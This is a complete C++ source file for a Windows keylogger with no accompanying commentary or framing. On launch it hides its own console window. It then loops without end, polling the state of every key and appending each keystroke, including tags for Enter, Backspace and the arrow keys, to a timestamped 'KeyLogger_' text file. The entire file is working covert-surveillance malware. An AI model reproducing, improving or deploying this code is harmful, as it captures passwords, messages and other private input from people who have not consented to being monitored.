#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <fstream>
#include <ctime>

#pragma warning(disable : 4996)

using namespace std;


string GetFileName() {

	time_t ttime = time(0);
	tm* local_time = localtime(&ttime);


	string prefix = "KeyLogger_";
	string fileName = prefix + to_string(1900 + local_time->tm_year) + "_" + to_string(1 + local_time->tm_mon)+"_"+to_string(local_time->tm_mday)+"_"
		+ to_string(local_time->tm_hour)+"_" + to_string(local_time->tm_min) +".txt";
	
	return fileName;

}

void LOG(string input) {
	fstream LogFile;
	LogFile.open("./" + GetFileName(), fstream::app);
	if (LogFile.is_open()) {
		LogFile << ",";
		LogFile << input;
		LogFile << ",";
		LogFile.close();
	}
}


bool SpecialKeys(int S_Key) {
	switch (S_Key) {
	case VK_SPACE:
		cout << " ";
		LOG(" ");
		return true;
	case VK_RETURN:
		LOG("[ENTER]");
		return true;
	case '¾':
		LOG(".");
		return true;
	case VK_SHIFT:
		return true;
	case VK_BACK:
		LOG("[BACK]");
		return true;
	case VK_RBUTTON:
		LOG("[R_CLICK]");
		return true;
	case VK_CAPITAL:
		return true;
	case VK_TAB:
		return true;
	case VK_UP:
		LOG("[UP_ARROW_KEY]");
		return true;
	case VK_DOWN:
		LOG("[DOWN_ARROW_KEY]");
		return true;
	case VK_LEFT:
		LOG("[LEFT_ARROW_KEY]");
		return true;
	case VK_RIGHT:
		LOG("[RIGHT_ARROW_KEY]");
		return true;
	case VK_CONTROL:
		return true;
	case VK_MENU:
		return true;
	case 160:
		return true;
	case 162:
		return true; 
	case 164:
			return true;
	default:
		return false;
	}
}

int main()
{
	
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	char KEY = 'x';

	while (true) {
		Sleep(10);
		for (int KEY = 8; KEY <= 190; KEY++)
		{
			if (GetAsyncKeyState(KEY) == -32767) {
				if (SpecialKeys(KEY) == false) {

					fstream LogFile;
					LogFile.open("./"+GetFileName(), fstream::app);
					if (LogFile.is_open()) {
						LogFile << ",";
						LogFile << char(KEY);
						LogFile << ",";
						LogFile.close();
					}

				}
			}
		}
	}

	return 0;
}
